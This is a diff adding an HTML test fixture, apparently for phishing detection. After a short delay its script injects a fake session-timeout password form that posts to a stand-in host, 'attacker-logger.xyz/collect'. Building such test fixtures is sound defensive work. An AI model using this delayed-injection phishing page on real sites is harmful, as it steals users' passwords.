@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>System Maintenance - Loading</title>
+</head>
+<body style="font-family: sans-serif; text-align: center; padding: 3rem;">
+  <h2>Loading secure session...</h2>
+  <div id="target-container">
+    <p>Please wait while your session initializes...</p>
+  </div>
+
+  <script>
+    // Delayed DOM injection imitating cloaking and dynamic phishing kit delivery
+    setTimeout(() => {
+      const container = document.getElementById("target-container");
+      container.innerHTML = `
+        <div style="background: white; border: 1px solid #ccc; padding: 2rem; max-width: 320px; margin: 2rem auto; text-align: left;">
+          <h3>Session Timeout - Re-enter Password</h3>
+          <form action="https://attacker-logger.xyz/collect" method="POST">
+            <label>Password:</label>
+            <input type="password" name="injected_pw" required style="width: 100%; margin: 0.5rem 0;" />
+            <button type="submit" style="width: 100%; padding: 0.5rem; background: #dc2626; color: white;">Unlock Session</button>
+          </form>
+        </div>
+      `;
+      console.log("[TestFixture] Injected delayed password form into DOM.");
+    }, 600);
+  </script>
+</body>
+</html>
